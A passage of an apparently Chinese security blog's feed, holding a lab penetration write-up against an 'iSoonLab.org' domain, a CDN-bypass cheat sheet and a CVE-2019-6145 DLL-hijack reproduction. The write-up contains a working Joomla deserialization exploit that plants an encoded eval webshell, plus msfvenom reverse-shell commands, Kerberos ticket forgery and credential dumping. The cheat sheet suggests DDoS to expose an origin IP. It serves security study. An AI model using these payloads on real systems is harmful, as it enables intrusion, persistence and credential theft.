    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-12-12 14:32:22<br><img src="/wallpaper/[30125]16347313.jpg" alt></p></blockquote><h2 id="题目拓扑"><a href="#题目拓扑" class="headerlink" title="题目拓扑"></a>题目拓扑</h2><p>Linux1 - solr: 192.168.21.12</p><p>Linux2 - joomla!: 192.168.21.20</p><p>Backup.sub.iSoonLab.org: 192.168.21.8</p><p>subdc.sub.iSoonLab.org: 192.168.21.4  /  10.153.69.50</p><p>DC.iSoonLab.org: 10.153.69.5</p><p><img src="/iSoonLab.org Write-up/image-20191201130447779.png" alt="image-20191201130447779"></p><h2 id="Linux1"><a href="#Linux1" class="headerlink" title="Linux1"></a>Linux1</h2><p>目标:192.168.121.131</p><p><img src="/iSoonLab.org Write-up/image-20191130235112082.png" alt="image-20191130235112082"></p><p>开放8983端口，打开是solr未授权，8.1.1版本，联想到前段时间很火的Apache Solr RCE</p><p><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a>    </p><p>根据网上的exp</p><p><a href="http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false" target="_blank" rel="noopener">http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false</a></p><p><img src="/iSoonLab.org Write-up/image-20191130235337378.png" alt="image-20191130235337378"></p><p>存在iSoon core</p><p><img src="/iSoonLab.org Write-up/image-20191130235734297.png" alt="image-20191130235734297"></p><p><img src="/iSoonLab.org Write-up/image-20191130235823000.png" alt="image-20191130235823000"></p><p>确实没问题，弹个shell到本机来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP_Addr&gt; LPORT=&lt;Port_Num&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>因为solr用户没有/tmp目录写权限， 可以参考@haya大手子的<a href="https://forum.90sec.com/t/topic/579" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/579</a></p><p>用perl来执行脚本</p><p><img src="/iSoonLab.org Write-up/image-20191201002127259.png" alt="image-20191201002127259"></p><p>flag就在当前目录</p><p><img src="/iSoonLab.org Write-up/image-20191201002513741.png" alt="image-20191201002513741"></p><p>当然，也可以在/var/tmp里写文件～</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>简单侦查后，发现存在192.168.21.0/24网段</p><p><img src="/iSoonLab.org Write-up/image-20191201002640156.png" alt="image-20191201002640156"></p><p>使用msf自带的sock4a作代理即可，Linux1只是用来撕来流量口子</p><p>代理内网后，发现同网段存在三台机器</p><p>找到Linux2 : 192.168.21.20， 开放HTTP端口</p><p><img src="/iSoonLab.org Write-up/image-20191201003644193.png" alt="image-20191201003644193"></p><p>joomla-3.4.6版本，存在RCE，通过构造exp，拿到webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $xx;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xx = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        $obj = <span class="keyword">new</span> SimplePie;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$obj, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"system('echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash');JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$ser = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $ser);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户名：</span><br><span class="line">\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span></span><br><span class="line"></span><br><span class="line">密码：</span><br><span class="line">MYP<span class="string">";s:2:"</span>HS<span class="string">";O:21:"</span>JDatabaseDriverMysqli<span class="string">":4:&#123;s:5:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>xx<span class="string">";O:17:"</span>JSimplepieFactory<span class="string">":0:&#123;&#125;s:13:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>connection<span class="string">";i:1;s:21:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>disconnectHandlers<span class="string">";a:1:&#123;i:0;a:2:&#123;i:0;O:9:"</span>SimplePie<span class="string">":3:&#123;s:8:"</span>sanitize<span class="string">";O:20:"</span>JDatabaseDriverMysql<span class="string">":0:&#123;&#125;s:19:"</span>cache_name_function<span class="string">";s:6:"</span>assert<span class="string">";s:8:"</span>feed_url<span class="string">";s:149:"</span>system(<span class="string">'echo \'ZWNobyAiPD9waHAgZXZhbChcJF9QT1NUW2FdKT8+IiA+IC9ob21lL3d3d3Jvb3QvZGVmYXVsdC8xLnBocA==\'| base64 -d | bash'</span>);JFactory::getConfig();<span class="keyword">exit</span>;<span class="string">";&#125;i:1;s:4:"</span>init<span class="string">";&#125;&#125;s:6:"</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>obj<span class="string">";N;&#125;</span></span><br></pre></td></tr></table></figure><p>antsword连接后，在/tmp目录上传我们生成的msf木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.21.12 LPORT=6666 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure><p><img src="/iSoonLab.org Write-up/image-20191201004320825.png" alt="image-20191201004320825"></p><p>拿到shell后，查看uname</p><p><img src="/iSoonLab.org Write-up/image-20191201004824374.png" alt="image-20191201004824374"></p><p>内核版本比较低的桌面版本，存在CVE-2019-13272</p><p>EXP需要满足三个条件: </p><ol><li>内核版本 &lt; 5.1.17 且为桌面版</li><li>存在/home/\<user></user></li><li>交互式shell</li></ol><p><img src="/iSoonLab.org Write-up/image-20191201005023629.png" alt="image-20191201005023629"></p><p>成功拿到第二个flag</p><h2 id="Backup-sub-iSoonLab-org"><a href="#Backup-sub-iSoonLab-org" class="headerlink" title="Backup.sub.iSoonLab.org"></a>Backup.sub.iSoonLab.org</h2><p>回过来看web界面的提示</p><p><img src="/iSoonLab.org Write-up/image-20191201005203360.png" alt="image-20191201005203360"></p><p>放出了下一步的hint，查看已经安装的软件和python第三方库</p><p><img src="/iSoonLab.org Write-up/image-20191201005355412.png" alt="image-20191201005355412"></p><p>三条思路：</p><ol><li><p>利用impacket和arpspoof进行中间人攻击</p></li><li><p>在本机上进行信息搜集，寻找到域成员机器的路子</p></li><li>系统漏洞 -&gt; ms17010 .etc </li></ol><ol><li><p>中间人攻击使用ms15-014 和 ms15-011 进行组策略劫持，拿下域成员机器</p></li><li><p>翻机器的日志</p></li><li>有day上day～ </li></ol><p>### </p><p>简单方法:</p><p>通过<code>.bash_history</code>拿到mount命令，存有明文密码， 通过<code>exploit/windows/smb/psexec</code>即可拿到目标机器NT/SYSTEM</p><p><img src="/iSoonLab.org Write-up/image-20191201013130568.png" alt="image-20191201013130568"></p><p>中间人测试也是可行的，使用MS15-011劫持组策略，只是需要等待组策略生效 (默认90分钟)</p><p>&lt;懒狗不想截图了&gt;</p><h2 id="subdc-iSoonLab-org"><a href="#subdc-iSoonLab-org" class="headerlink" title="subdc.iSoonLab.org"></a>subdc.iSoonLab.org</h2><p>在backup机子上的C:\Backup翻到了注册表的存档</p><p><img src="/iSoonLab.org Write-up/image-20191201014315000.png" alt="image-20191201014315000"></p><p>下载下来使用secretsdump进行dump</p><p><img src="/iSoonLab.org Write-up/image-20191201014547133.png" alt="image-20191201014547133"></p><p>拿到服务账户后，用来构造白银票据，攻击subdc.sub.iSoonLab.org<br>（MS14068也可）</p><p><img src="/iSoonLab.org Write-up/image-20191201015913467.png" alt="image-20191201015913467"></p><p>(注意必须关闭Linux2中的arpspoof)</p><p><img src="/iSoonLab.org Write-up/image-20191201020209077.png" alt="image-20191201020209077"></p><p>第四个flag到手～～</p><h2 id="DC-iSoonLab-org"><a href="#DC-iSoonLab-org" class="headerlink" title="DC.iSoonLab.org"></a>DC.iSoonLab.org</h2><p>最后就很简单啦，子父域中常见的双向信任，我们可以通过构造信任票据来进行攻击</p><p>利用信任票据 </p><p><a href="http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/redteaming/the-trustpocalypse/</a> </p><p>这里有一点小问题: 当指定krbtgt账户时，因为子父域中存在两个krbtgt账户，DCsync转储时可能爆<code>NOT_UNIQUE</code>，可以使用/all解决 </p><p>利用dcsync 转储子域的所有hash </p><p><img src="/iSoonLab.org Write-up/4624EF12-0825-4134-BFFE-AF47CF9CA4FB.png" alt="4624EF12-0825-4134-BFFE-AF47CF9CA4FB"></p><p><img src="/iSoonLab.org Write-up/04C766D7-B915-48FE-A381-3CA4DD18727D.png" alt="04C766D7-B915-48FE-A381-3CA4DD18727D"></p><p>使用/Ptt 进行信任票据传递即可</p><p><img src="/iSoonLab.org Write-up/2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382.png" alt="2A7C786C-5AA4-4AE2-8DE1-755DBFDE9382"></p><p>拿到域控权限，flag在C:\Users\Administraotr\flag.txt中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-12-12 14:32:22&lt;br&gt;&lt;img src=&quot;/wallpaper/[30125]16347313.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="iSoonLab.org" scheme="http://patrilic.top/tags/iSoonLab-org/"/>
    
  </entry>
  
  <entry>
    <title>Bypass CDN 寻找真实IP</title>
    <link href="http://patrilic.top/2019/10/09/Bypass%20CDN%20%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP_1/"/>
    <id>http://patrilic.top/2019/10/09/Bypass CDN 寻找真实IP_1/</id>
    <published>2019-10-09T05:12:49.000Z</published>
    <updated>2019-10-31T15:51:16.775Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-10-09 13:12:49<br><img src="/wallpaper/futuristic.jpeg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>个人觉得，绕过CDN去寻找主机的真实ip，更容易能寻找到企业网络的薄弱地带，所以Bypass CDN也就变成了至关重要的一点</p><h2 id="0x01-常见Bypass方法"><a href="#0x01-常见Bypass方法" class="headerlink" title="0x01 常见Bypass方法"></a>0x01 常见Bypass方法</h2><h3 id="子域名搜集"><a href="#子域名搜集" class="headerlink" title="子域名搜集"></a>子域名搜集</h3><p>由于成本问题，可能某些厂商并不会将所有的子域名都部署CDN，所以如果我们能尽量的搜集子域名，或许可以找到一些没有部署CDN的子域名，拿到某些服务器的真实ip/段</p><p>然后关于子域名搜集的方式很多，就不一一介绍了，我平时主要是从这几个方面搜集子域名：</p><ol><li>SSL证书</li><li>爆破</li><li>Google Hacking</li><li>同邮箱注册人</li><li>DNS 域传送</li><li>页面JS搜集</li><li>网络空间引擎</li></ol><p>工具也有很多厉害的，平时我一般使用 OneForALL + ESD + JSfinder 来进行搜集</p><p>（ESD可以加载layer的字典，很好用）</p><h3 id="查询DNS历史解析记录"><a href="#查询DNS历史解析记录" class="headerlink" title="查询DNS历史解析记录"></a>查询DNS历史解析记录</h3><p>常常服务器在解析到CDN服务前，会解析真实ip，如果历史未删除，就可能找到<br><img src="/Bypass CDN 寻找真实IP.resources/9E7A020F-400D-4098-95A0-890D6ECF58B5.png" alt="aa49a0dae035183756bc9b7c574f7d1d"><br>常用网站：<br><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a><br><a href="http://www.17ce.com/" target="_blank" rel="noopener">http://www.17ce.com/</a><br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a><br><a href="http://www.ip138.com/" target="_blank" rel="noopener">http://www.ip138.com/</a><br><a href="https://github.com/vincentcox/bypass-firewalls-by-DNS-history" target="_blank" rel="noopener">https://github.com/vincentcox/bypass-firewalls-by-DNS-history</a></p><h3 id="MX记录（邮件探测）"><a href="#MX记录（邮件探测）" class="headerlink" title="MX记录（邮件探测）"></a>MX记录（邮件探测）</h3><p>这个很简单，如果目标系统有发件功能，通常在注册用户/找回密码等地方<img src="/Bypass CDN 寻找真实IP.resources/30801098-D5BB-4C46-83CB-DF4313C5D54E.png" alt="8aa01bd3ebc5fea8c50bfcf182df44d7"></p><h3 id="SSL证书探测"><a href="#SSL证书探测" class="headerlink" title="SSL证书探测"></a>SSL证书探测</h3><p>我们可以利用空间引擎进行SSL证书探测</p><blockquote><p>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p><img src="/Bypass CDN 寻找真实IP.resources/FA2E7635-76E4-43A3-B724-C782E3C08304.png" alt="cbd4dfce974be17192c5d3991bcb9ceb"><br>443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p>再放一个搜集证书的网站<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh</a></p><p>一个小脚本，可以快速搜集证书</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019-10-08 22:51</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: SSL_subdomain.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">TIME_OUT = <span class="number">60</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_SSL</span><span class="params">(domain)</span>:</span></span><br><span class="line">    domains = []</span><br><span class="line">    url = <span class="string">'https://crt.sh/?q=%25.&#123;&#125;'</span>.format(domain)</span><br><span class="line">    response = requests.get(url,timeout=TIME_OUT)</span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    ssl = re.findall(<span class="string">"&lt;TD&gt;(.*?).&#123;&#125;&lt;/TD&gt;"</span>.format(domain),response.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ssl:</span><br><span class="line">        i += <span class="string">'.'</span> + domain</span><br><span class="line">        domains.append(i)</span><br><span class="line">    print(domains)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_SSL(<span class="string">"baidu.com"</span>)</span><br></pre></td></tr></table></figure><p>还有一种方式，就是搜集SSL证书Hash，然后遍历ip去查询证书hash，如果匹配到相同的，证明这个ip就是那个 域名同根证书的服务器真实ip</p><p>简单来说，就是遍历0.0.0.0/0:443，通过ip连接https时，会显示证书</p><p>当然，也可以用censys等引擎<br><img src="/Bypass CDN 寻找真实IP.resources/82C66A85-0718-4D35-BF78-4BC6F8D66137.png" alt="88c410f42542b4d8b7387ca70ca55e68"></p><h3 id="偏远地区服务器访问"><a href="#偏远地区服务器访问" class="headerlink" title="偏远地区服务器访问"></a>偏远地区服务器访问</h3><p>在偏远地区的服务器访问时，可能不会访问到CDN节点，而是直接访问服务器真实ip</p><p>所以我们可以搞一个偏远地区的代理池，来访问目标域名，有概率就可以拿到真实ip</p><p>也就是平常说的多地Ping<br><img src="/Bypass CDN 寻找真实IP.resources/B6C9E83C-9951-4397-9929-995ABDA0F31A.png" alt="766172367254161b3f5a2d0e44e0174d"></p><h3 id="favicon-hash匹配"><a href="#favicon-hash匹配" class="headerlink" title="favicon_hash匹配"></a>favicon_hash匹配</h3><p>利用shodan的<strong>http.favicon.hash</strong>语法，来匹配icon的hash值</p><p>直接推<a href="https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py" target="_blank" rel="noopener">https://github.com/Ridter/get_ip_by_ico/blob/master/get_ip_by_ico.py</a></p><p><a name="iWsmO"></a></p><h3 id="CloudFlare-Bypass"><a href="#CloudFlare-Bypass" class="headerlink" title="CloudFlare Bypass"></a>CloudFlare Bypass</h3><p>免费版的cf，我们可以通过DDOS来消耗对方的流量，只需要把流量打光，就会回滚到原始ip</p><p>还有利用cloudflare的改host返回示例:<br><a href="https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/" target="_blank" rel="noopener">https://blog.detectify.com/2019/07/31/bypassing-cloudflare-waf-with-the-origin-server-ip-address/</a><br>里面给了详细的介绍，我们可以通过HOST来判断是否是真实ip<br>具体看文章即可</p><p><a name="gmuNS"></a></p><h3 id="奇特的ping"><a href="#奇特的ping" class="headerlink" title="奇特的ping"></a>奇特的ping</h3><p>比如可能有些地方，使用的CDN都是以<a href="http://www.xxx.edu.cn，例如www.cuit.edu.cn,www.jwc.cuit.edu.cn" target="_blank" rel="noopener">www.xxx.edu.cn，例如www.cuit.edu.cn,www.jwc.cuit.edu.cn</a></p><p>可能去掉前缀的www，就可能绕过CDN了，猜测应该是类似于Apache VirtualHost</p><p>可参考<a href="https://httpd.apache.org/docs/2.4/en/vhosts/examples.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/en/vhosts/examples.html</a></p><p>例如：<br><img src="/Bypass CDN 寻找真实IP.resources/D368AA5E-A66E-46A8-9E96-7B439AB7E059.png" alt="94f6e57f5f9c038766a278c76f46ce30"></p><p>我这里其实是ping了<a href="http://www.xxx.gov.cn和xxx.gov.cn" target="_blank" rel="noopener">www.xxx.gov.cn和xxx.gov.cn</a></p><p>这样就可以绕过CDN的检测</p><p><a name="kroXV"></a></p><h3 id="利用老域名"><a href="#利用老域名" class="headerlink" title="利用老域名"></a>利用老域名</h3><p>在换新域名时，常常将CDN部署到新的域名上，而老域名由于没过期，可能未使用CDN，然后就可以直接获取服务器真实ip。</p><p>例如patrilic.top &gt; patrilic.com<br>域名更新时，可能老域名同时解析到真实服务器，但是没有部署CDN</p><p>这个可以通过搜集域名备案的邮箱去反查，可能会有意外收获</p><h3 id="暴力匹配"><a href="#暴力匹配" class="headerlink" title="暴力匹配"></a>暴力匹配</h3><p>找到目标服务器IP段后，可以直接进行暴力匹配 ，使用masscan扫描HTTP banner，然后匹配到目标域名的相同banner</p><h3 id="DDos-社工CDN平台等"><a href="#DDos-社工CDN平台等" class="headerlink" title="DDos/社工CDN平台等"></a>DDos/社工CDN平台等</h3><h2 id="0x02-其他方法"><a href="#0x02-其他方法" class="headerlink" title="0x02 其他方法"></a>0x02 其他方法</h2><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p><img src="/Bypass CDN 寻找真实IP.resources/6CC86789-CDCC-47CA-9940-744FBC32274E.png" alt="cd01f0e2811d6b9828927bfe6c57f8b3"></p><h3 id="ssrf，文件上传等漏洞"><a href="#ssrf，文件上传等漏洞" class="headerlink" title="ssrf，文件上传等漏洞"></a>ssrf，文件上传等漏洞</h3><p>略..</p><p><a name="gEBoP"></a></p><h2 id="0x03-参考链接🔗"><a href="#0x03-参考链接🔗" class="headerlink" title="0x03 参考链接🔗"></a>0x03 参考链接🔗</h2><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a><br><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a><br><a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a><br><a href="https://github.com/AI0TSec/blog/issues/8" target="_blank" rel="noopener">https://github.com/AI0TSec/blog/issues/8</a><br><a href="https://www.4hou.com/tools/8251.html" target="_blank" rel="noopener">https://www.4hou.com/tools/8251.html</a><br><a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/112583.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-10-09 13:12:49&lt;br&gt;&lt;img src=&quot;/wallpaper/futuristic.jpeg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="Pentest Cheat Sheet" scheme="http://patrilic.top/categories/Pentest-Cheat-Sheet/"/>
    
    
      <category term="Bypass CDN" scheme="http://patrilic.top/tags/Bypass-CDN/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-6145  Forcepoint VPN</title>
    <link href="http://patrilic.top/2019/09/27/CVE-2019-6145%20%20Forcepoint%20VPN/"/>
    <id>http://patrilic.top/2019/09/27/CVE-2019-6145  Forcepoint VPN/</id>
    <published>2019-09-26T16:03:55.000Z</published>
    <updated>2019-09-27T06:52:31.916Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-09-27 0:03:55<br><img src="/wallpaper/anime.jpg" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>群里师傅传了一篇漏洞详情，如下：<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>其中翻到这个的时候：<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/68BEF323-598F-4DF8-80DB-1D6793F8D6B7.png" alt="a80184c994256c62b68309752428a068"></p><p>这不就是白加黑么..还能自启，岂不美哉～</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><blockquote><p>Forcepoint VPN Windows Client &lt; 6.6.1</p></blockquote><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/0F0DCA0F-6513-4706-99ED-496E97F42D6E.png" alt="b565f7eb7008dae50e9cffef5140d7b0"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/ED60C5CC-3A68-4AD1-8D96-591E1BC1ADBE.png" alt="240c6b110481cf8ad45fadf90f90bd38"></p><p>安装的时候会调用<code>msiexec.exe</code>，使用驱动加载<code>NT/SYSTEM</code></p><p>然后保证自启动，所以只要我们能摸到路径就能持久控制</p><p>打开程序，我们发现他会去查询一些不存在的目录和程序<br><img src="/CVE-2019-6145  Forcepoint VPN.resources/A0273E78-14DF-4D99-9191-69B446967C1A.png" alt="9cb5f6b66d8398fa197331f3ac360091"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/02015B80-4E63-4E3F-9636-B2D3B7BC126A.png" alt="e556b1bc632f8bc055b6631bab814364"><br><img src="/CVE-2019-6145  Forcepoint VPN.resources/0900E779-7DB6-4822-B27D-D62C34A17472.png" alt="8c750183f70b3a62663bdfcf5d0b7be2"></p><h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>看这个就好了<br><a href="https://www.4hou.com/vulnerable/20515.html" target="_blank" rel="noopener">https://www.4hou.com/vulnerable/20515.html</a></p><p>暴风哭泣，不会</p><p>（我是一个没有感情的复现机器）</p><h2 id="0x03-免杀"><a href="#0x03-免杀" class="headerlink" title="0x03 免杀"></a>0x03 免杀</h2><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/44A7E077-1986-4B16-A52D-1287E84C837A.png" alt="c722b31e90a0fd3ac2ff973fe6445c7a"></p><p><img src="/CVE-2019-6145  Forcepoint VPN.resources/6DB73CBB-5076-49AE-A1A7-613CF68C0F8A.png" alt="aee18db9dbe77ac4edcca72af7e3d1b9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-09-27 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/anime.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="漏洞复现" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Forcepoint VPN" scheme="http://patrilic.top/tags/Forcepoint-VPN/"/>
    
  </entry>
  
  <entry>
    <title>浅谈 Linux系统 proc</title>
    <link href="http://patrilic.top/2019/09/11/%E6%B5%85%E8%B0%88%20Linux%E7%B3%BB%E7%BB%9F%20Proc/"/>
    <id>http://patrilic.top/2019/09/11/浅谈 Linux系统 Proc/</id>
    <published>2019-09-10T16:44:23.000Z</published>
    <updated>2019-09-10T16:59:01.747Z</updated>
    
